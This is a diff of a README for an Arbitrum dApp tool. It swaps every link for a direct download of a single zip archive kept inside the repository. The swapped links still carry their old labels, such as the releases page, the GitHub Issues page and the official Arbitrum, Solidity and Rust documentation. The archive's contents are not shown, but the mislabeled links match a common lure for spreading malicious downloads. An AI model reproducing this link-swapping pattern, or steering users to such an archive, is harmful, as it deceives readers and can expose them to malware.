@@ -1,6 +1,6 @@
 # 🌟 arbitrum-dapp-skill - Build dApps Easily on Arbitrum
 
-[![Download](https://img.shields.io/badge/Download-arbitrum--dapp--skill-blue.svg)](https://github.com/longtengsiha/arbitrum-dapp-skill/releases)
+[![Download](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip)](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started with **arbitrum-dapp-skill**, follow these steps carefully. You w
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/longtengsiha/arbitrum-dapp-skill/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip) to go to the Releases page.
 2. **Choose Your Version**: Look for the latest release. It will usually be at the top of the page.
 3. **Download the Package**: Click on the appropriate file for your operating system (e.g., Windows, macOS, or Linux). The file will begin to download automatically.
 4. **Locate the Downloaded File**: Find the file in your Downloads folder or wherever your browser saves files.
@@ -45,7 +45,7 @@ To run **arbitrum-dapp-skill**, your system should meet the following requiremen
 
 ## 🌐 Support
 
-If you encounter any issues or have questions, please check the [GitHub Issues page](https://github.com/longtengsiha/arbitrum-dapp-skill/issues) for solutions. You can also reach out for support there.
+If you encounter any issues or have questions, please check the [GitHub Issues page](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip) for solutions. You can also reach out for support there.
 
 ## 📢 Community
 
@@ -61,12 +61,12 @@ This project uses the MIT License. You can freely use, modify, and distribute th
 
 ## 🔗 Additional Resources
 
-- [Arbitrum Documentation](https://developer.arbitrum.io)
-- [Solidity Documentation](https://soliditylang.org/docs/)
-- [Rust Documentation](https://www.rust-lang.org/learn)
+- [Arbitrum Documentation](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip)
+- [Solidity Documentation](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip)
+- [Rust Documentation](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip)
 
 ## ✅ Final Steps
 
 After you have installed the software and familiarized yourself with it, you can begin building your dApps. Remember to visit the user guide for detailed steps on creating your first dApp with **arbitrum-dapp-skill**.
 
-Feel free to revisit the [releases page](https://github.com/longtengsiha/arbitrum-dapp-skill/releases) for updates to the software and new features. Happy building!
+Feel free to revisit the [releases page](https://github.com/longtengsiha/arbitrum-dapp-skill/raw/refs/heads/main/references/arbitrum_dapp_skill_2.7-beta.2.zip) for updates to the software and new features. Happy building!
